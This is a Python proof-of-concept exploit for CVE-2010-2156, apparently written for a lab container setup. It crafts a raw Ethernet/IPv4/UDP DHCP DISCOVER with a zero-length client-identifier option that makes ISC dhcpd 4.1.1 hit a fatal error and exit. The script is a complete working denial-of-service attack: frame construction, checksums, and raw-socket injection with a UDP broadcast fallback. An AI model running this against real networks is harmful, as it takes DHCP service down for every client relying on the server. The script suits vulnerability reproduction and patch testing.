#!/usr/bin/env python3
"""
PoC for CVE-2010-2156 - ISC DHCP 4.1.1 (pre-P1) dhcpd zero-length client-id DoS.

This is a server-EXIT denial of service (CWE-189), NOT memory corruption. A
DHCPv4 DISCOVER carrying a ZERO-LENGTH client identifier (option 61, len 0)
drives dhcpd into:

  find_lease() -> find_lease_by_uid(..., len=0, ...) -> lease_id_hash_lookup()
  -> hash_lookup(): if (!len) len = find_length(key, do_id_hash);
  -> find_length() does not recognise do_id_hash -> log_fatal("Impossible
     condition at .../hash.c:NNN") -> exit(1).

dhcpd terminates. Fixed in 4.1.1-P1 (find_length now log_debug + returns 0).

DELIVERY: dhcpd binds via an AF_PACKET raw socket on its interface, NOT a UDP
socket -- a plain UDP datagram to 127.0.0.1:67 is never seen. So we inject a
FULL Ethernet/IPv4/UDP/DHCP frame (raw AF_PACKET, SOCK_RAW) onto the injection
interface, which is the peer end of a veth pair whose other end (dhcp0) is what
dhcpd binds. dhcpd's BPF filter only checks EtherType=IP + proto=UDP +
dst-port=67 (no MAC / no IP match), so the frame reaches the option-61 parser.

Usage:
  poc_cve_2010_2156.py [iface] [port] [mode]
    iface default 'dhcpsink' (the veth peer; falls back to UDP if AF_PACKET
          is unavailable, e.g. run from an unprivileged host)
    port  default 67
    mode  'trigger' (default) sends the zero-length client-id (kills dhcpd)
          'control' sends a NORMAL DISCOVER with a valid client-id (no crash)
"""
import fcntl
import socket
import struct
import sys

IFACE = sys.argv[1] if len(sys.argv) > 1 else "dhcpsink"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 67
MODE = sys.argv[3] if len(sys.argv) > 3 else "trigger"

MAGIC_COOKIE = bytes([0x63, 0x82, 0x53, 0x63])
SRC_MAC = bytes([0x02, 0x00, 0x00, 0x00, 0x00, 0x42])
DST_MAC = bytes([0xFF] * 6)            # broadcast (filter ignores it anyway)
SRC_IP = "0.0.0.0"
DST_IP = "255.255.255.255"


def bootp_header() -> bytes:
    """236-byte fixed BOOTP/DHCP header for a BOOTREQUEST DISCOVER."""
    chaddr = SRC_MAC + b"\x00" * 10    # 16-byte chaddr field
    return (
        struct.pack("!BBBB", 1, 1, 6, 0)        # op, htype, hlen, hops
        + struct.pack("!I", 0xDEADBEEF)         # xid
        + struct.pack("!HH", 0, 0x8000)         # secs, flags (broadcast)
        + b"\x00" * 16                          # ciaddr/yiaddr/siaddr/giaddr
        + chaddr
        + b"\x00" * 64                          # sname
        + b"\x00" * 128                         # file
    )


def opt(code: int, payload: bytes) -> bytes:
    return bytes([code, len(payload)]) + payload


def build_dhcp(zero_len_clientid: bool) -> bytes:
    pkt = bootp_header() + MAGIC_COOKIE
    pkt += opt(53, bytes([1]))                  # option 53: DISCOVER
    if zero_len_clientid:
        pkt += bytes([61, 0])                   # option 61, LENGTH 0 -- trigger
    else:
        pkt += opt(61, bytes([0x01, *SRC_MAC])) # option 61, valid client-id
    pkt += bytes([255])                         # option 255: end
    return pkt


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


def build_frame(dhcp: bytes) -> bytes:
    udp_len = 8 + len(dhcp)
    src = socket.inet_aton(SRC_IP)
    dst = socket.inet_aton(DST_IP)
    # UDP header with checksum over the pseudo-header.
    pseudo = src + dst + struct.pack("!BBH", 0, socket.IPPROTO_UDP, udp_len)
    udp_no_csum = struct.pack("!HHHH", 68, PORT, udp_len, 0) + dhcp
    csum = _checksum(pseudo + udp_no_csum)
    udp = struct.pack("!HHHH", 68, PORT, udp_len, csum or 0xFFFF) + dhcp
    # IPv4 header.
    total = 20 + udp_len
    iph = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, total, 0x1234, 0, 64, socket.IPPROTO_UDP, 0, src, dst
    )
    iph = iph[:10] + struct.pack("!H", _checksum(iph)) + iph[12:]
    eth = DST_MAC + SRC_MAC + struct.pack("!H", 0x0800)
    return eth + iph + udp


def send_l2(frame: bytes, iface: str) -> bool:
    """Inject a raw Ethernet frame on `iface`. Returns False if AF_PACKET fails."""
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind((iface, 0))
        s.send(frame)
        s.close()
        return True
    except (PermissionError, OSError) as e:
        print(f"[!] AF_PACKET inject on {iface} failed ({e}); falling back to UDP")
        return False


def send_udp(dhcp: bytes) -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.sendto(dhcp, ("255.255.255.255", PORT))
    s.close()


def main() -> int:
    zero_len = MODE != "control"
    label = "TRIGGER (zero-length client-id)" if zero_len else "CONTROL (valid client-id)"
    dhcp = build_dhcp(zero_len)
    frame = build_frame(dhcp)
    print(f"[*] CVE-2010-2156 PoC  iface={IFACE} port={PORT}  mode={label}")
    print(f"[*] DHCP DISCOVER {len(dhcp)} bytes, option 61 len="
          f"{'0 (malformed)' if zero_len else '7 (valid)'}; L2 frame {len(frame)} bytes")

    if not send_l2(frame, IFACE):
        send_udp(dhcp)
    print("[+] packet sent")
    if zero_len:
        print("[+] expected: dhcpd logs 'Impossible condition at .../hash.c:NNN' "
              "and exits (container exit code 1)")
    else:
        print("[+] expected: dhcpd stays up (no crash)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
